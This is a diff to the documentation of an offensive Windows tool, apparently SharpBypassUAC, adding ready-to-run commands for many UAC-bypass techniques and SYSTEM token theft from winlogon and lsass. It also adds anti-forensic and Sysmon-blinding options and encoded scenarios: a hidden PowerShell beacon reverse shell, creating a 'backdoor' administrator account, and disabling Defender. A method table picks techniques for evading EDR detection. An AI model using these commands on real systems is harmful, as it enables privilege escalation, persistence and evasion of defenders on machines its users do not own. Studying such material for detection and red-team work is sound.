@@ -142,77 +142,158 @@ SharpBypassUAC.exe -b <method> -e <base64command>
 
 **Examples:**
 
+```powershell
+# Encode commands to base64 (PowerShell):
+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("cmd.exe /c whoami > C:\out.txt"))
+#   → Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
+
+# Encode commands to base64 (Linux):
+echo -n "cmd.exe /c whoami > C:\out.txt" | base64
+```
+
+#### 1. Registry Hijack Methods
+
 ```bash
-# Registry hijack — fodhelper (simplest, Win10+)
-SharpBypassUAC.exe -b fodhelper -e Y21kLmV4ZSAvYyBwb3dlcnNoZWxsIC1lbmMgLi4u
+# fodhelper — simplest, Win10+, ms-settings registry hijack
+SharpBypassUAC.exe -b fodhelper -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
 
-# COM elevation — no registry artifact, broadest compatibility (Win7–Win11)
-SharpBypassUAC.exe -b cmstp -e Y21kLmV4ZSAvYyB3aG9hbWk=
+# eventvwr — oldest, Win7+, mscfile registry hijack
+SharpBypassUAC.exe -b eventvwr -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
 
-# Environment variable hijack — command must end with "&& REM"
+# computerdefaults — alternative ms-settings hijack, Win10+
+SharpBypassUAC.exe -b computerdefaults -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
+
+# sdclt — Folder handler hijack, Win10 ONLY (removed in Win11)
+SharpBypassUAC.exe -b sdclt -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
+
+# slui — exefile handler hijack, Win8+ (broad scope — hijacks all .exe Shell launches)
+SharpBypassUAC.exe -b slui -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
+```
+
+#### 2. Environment Variable / DLL Hijack Methods
+
+```bash
+# diskcleanup — windir env hijack via SilentCleanup task, Win10+
+# IMPORTANT: command MUST end with "&& REM" to comment out trailing args
 SharpBypassUAC.exe -b diskcleanup -e Y21kLmV4ZSAvYyBjYWxjLmV4ZSAmJiBSRU0=
+#   base64("cmd.exe /c calc.exe && REM")
 
-# File system + DLL hijack — x64 only, requires Intel GPU driver
-SharpBypassUAC.exe -b shadercache -e Y21kLmV4ZSAvYyB3aG9hbWk=
+# dotnetprofiler — COR_PROFILER DLL hijack via mmc.exe, Win7+ (UACME #39)
+# Drops a payload DLL → sets COR_PROFILER env vars → triggers mmc.exe eventvwr.msc
+SharpBypassUAC.exe -b dotnetprofiler -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
 
-# COM factory elevation — two-step COM indirection (UACME #74)
-SharpBypassUAC.exe -b factoryserver -e Y21kLmV4ZSAvYyB3aG9hbWk=
+# msdthijack — sdiagnhost DLL search path abuse, Win10+ (UACME #72)
+# Drops BluetoothDiagnosticUtil.dll → triggers msdt.exe Bluetooth diagnostic
+SharpBypassUAC.exe -b msdthijack -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
 
-# DiagCpl factory — alternative factory CLSID (UACME #75)
-SharpBypassUAC.exe -b diagcpl -e Y21kLmV4ZSAvYyB3aG9hbWk=
-
-# ALPC debug object — direct AppInfo RPC elevation (UACME #59)
-SharpBypassUAC.exe -b alpcdebug -e Y21kLmV4ZSAvYyB3aG9hbWk=
-
-# .NET Profiler — COR_PROFILER DLL hijack (UACME #39)
-SharpBypassUAC.exe -b dotnetprofiler -e Y21kLmV4ZSAvYyB3aG9hbWk=
-
-# MSDT DLL hijack — sdiagnhost DLL search path abuse (UACME #72)
-SharpBypassUAC.exe -b msdthijack -e Y21kLmV4ZSAvYyB3aG9hbWk=
+# shadercache — Intel GPU ShaderCache junction + oci.dll hijack, x64 only
+# Requires Intel GPU driver. Noisy: kills sihost.exe/ShellHost.exe temporarily
+SharpBypassUAC.exe -b shadercache -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
 ```
 
-### Token Impersonation (`-t`) — High → SYSTEM (or other identity)
-
-Use when you **already have high integrity** (local admin, elevated) and need to escalate to `NT AUTHORITY\SYSTEM` or impersonate another user's identity. This duplicates the security token from a running process and spawns a new process under that token.
-
-**Preconditions:** Already running as local admin with high integrity (or `SeDebugPrivilege` enabled).
-
-```
-SharpBypassUAC.exe -t <pid> -e <base64command>
-```
-
-**Examples:**
+#### 3. COM Elevation Methods
 
 ```bash
-# Step 1: Find the PID of a SYSTEM process
+# cmstp — CMSTPLUA COM elevation, Win7+ (cleanest — no registry, no file drop)
+SharpBypassUAC.exe -b cmstp -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
+
+# factoryserver — two-step COM via IElevatedFactoryServer, Win8.1+ (UACME #74)
+# Bypasses CLSID-specific monitoring for CMSTPLUA
+SharpBypassUAC.exe -b factoryserver -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
+
+# diagcpl — DiagCpl factory COM elevation, Win7+ (UACME #75)
+# Alternative factory CLSID — fallback if factoryserver is blocked
+SharpBypassUAC.exe -b diagcpl -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
+```
+
+#### 4. ALPC Debug Object
+
+```bash
+# alpcdebug — AppInfo RPC + debug object, Win7+ (UACME #59)
+# Direct RPC to AppInfo — no COM, no registry, no DLL drop
+SharpBypassUAC.exe -b alpcdebug -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
+```
+
+#### 5. Token Impersonation (requires High IL first)
+
+```bash
+# Step 1: Find PID of a SYSTEM process
 tasklist /FI "IMAGENAME eq winlogon.exe"
 #   winlogon.exe    624    Console    1    6,144 K
 
-# Step 2: Steal its token and spawn a SYSTEM shell
-SharpBypassUAC.exe -t 624 -e Y21kLmV4ZSAvYyB3aG9hbWk=
+# Step 2: Steal its token → spawn SYSTEM shell
+SharpBypassUAC.exe -t 624 -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
 
 # Or target lsass.exe for SYSTEM (higher EDR risk)
 tasklist /FI "IMAGENAME eq lsass.exe"
-SharpBypassUAC.exe -t 812 -e Y21kLmV4ZSAvYyB3aG9hbWk=
+SharpBypassUAC.exe -t 812 -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0
 ```
 
-### Chaining: Medium → High → SYSTEM
-
-In a typical engagement, both modes are used sequentially:
+#### 6. With Anti-Forensic & Evasion Flags
 
 ```bash
-# 1. Initial access: you have a medium-integrity shell as a local admin
+# Any method + anti-forensic cleanup (-c)
+# ETW patch → bypass → Prefetch/ShimCache/BAM wipe → self-delete
+SharpBypassUAC.exe -b fodhelper -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0 -c
+
+# Any method + Sysmon evasion (--blind-log)
+# Unload SysmonDrv + suspend EventLog threads BEFORE bypass
+SharpBypassUAC.exe -b cmstp -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0 --blind-log
+
+# Full stealth: anti-forensic + Sysmon evasion + COM elevation
+SharpBypassUAC.exe -b factoryserver -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0 -c --blind-log
+
+# Token impersonation + full cleanup
+SharpBypassUAC.exe -t 624 -e Y21kLmV4ZSAvYyB3aG9hbWkgPiBDOlxvdXQudHh0 -c --blind-log
+```
+
+#### 7. Real-World Scenarios
+
+```bash
+# Scenario A: Reverse shell from medium IL (Cobalt Strike / Sliver)
+#   Encode: powershell.exe -nop -w hidden -enc <beacon_b64>
+SharpBypassUAC.exe -b alpcdebug -e cG93ZXJzaGVsbC5leGUgLW5vcCAtdyBoaWRkZW4gLWVuYyA8YmVhY29uPg== -c
+
+# Scenario B: Add local admin account
+#   Encode: cmd.exe /c net user backdoor P@ssw0rd123 /add && net localgroup Administrators backdoor /add
+SharpBypassUAC.exe -b diagcpl -e Y21kLmV4ZSAvYyBuZXQgdXNlciBiYWNrZG9vciBQQHNzdzByZDEyMyAvYWRkICYmIG5ldCBsb2NhbGdyb3VwIEFkbWluaXN0cmF0b3JzIGJhY2tkb29yIC9hZGQ=
+
+# Scenario C: Disable Windows Defender from elevated context
+#   Encode: powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true
+SharpBypassUAC.exe -b cmstp -e cG93ZXJzaGVsbC5leGUgLWMgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZQ== -c --blind-log
+
+# Scenario D: Full chain — Medium → High → SYSTEM
 whoami /groups | findstr "Medium"
 #   Mandatory Label\Medium Mandatory Level
 
-# 2. UAC bypass: escalate to high integrity
-SharpBypassUAC.exe -b fodhelper -e <base64_reverse_shell>
+# Step 1: UAC bypass → get High IL reverse shell
+SharpBypassUAC.exe -b factoryserver -e <base64_reverse_shell> -c --blind-log
 #   → New shell at High integrity
 
-# 3. Token impersonation: escalate to SYSTEM
-SharpBypassUAC.exe -t 624 -e <base64_payload>
+# Step 2: In the new elevated shell → steal SYSTEM token
+tasklist /FI "IMAGENAME eq winlogon.exe"
+SharpBypassUAC.exe -t 624 -e <base64_payload> -c
 #   → Process running as NT AUTHORITY\SYSTEM
+
+# Scenario E: Lateral movement — impersonate another user's session
+#   Find a process running as target user
+tasklist /V /FI "USERNAME eq DOMAIN\TargetUser"
+SharpBypassUAC.exe -t <target_pid> -e Y21kLmV4ZSAvYyB3aG9hbWk= -c
 ```
+
+#### Method Selection Guide
+
+| Situation | Recommended Method | Why |
+|-----------|-------------------|-----|
+| Quick test, Win10+ | `fodhelper` | Simplest, fast, reliable |
+| Need Win7 support | `cmstp` or `diagcpl` | Broadest compatibility |
+| EDR monitoring CLSID | `factoryserver` or `diagcpl` | Bypasses CMSTPLUA CLSID detection |
+| EDR monitoring registry | `cmstp`, `alpcdebug` | No registry modification |
+| EDR monitoring COM | `alpcdebug` | No COM moniker, no DllHost.exe |
+| Minimal forensic footprint | `alpcdebug` | No registry, no COM, no DLL |
+| Blue team detection test | `shadercache` | Most artifacts — ideal for SOC validation |
+| Win10 only target | `sdclt` or `msdthijack` | Version-specific methods |
+| Already elevated → SYSTEM | `-t <pid>` | Token impersonation, not UAC bypass |
 
 ### Additional Options
 
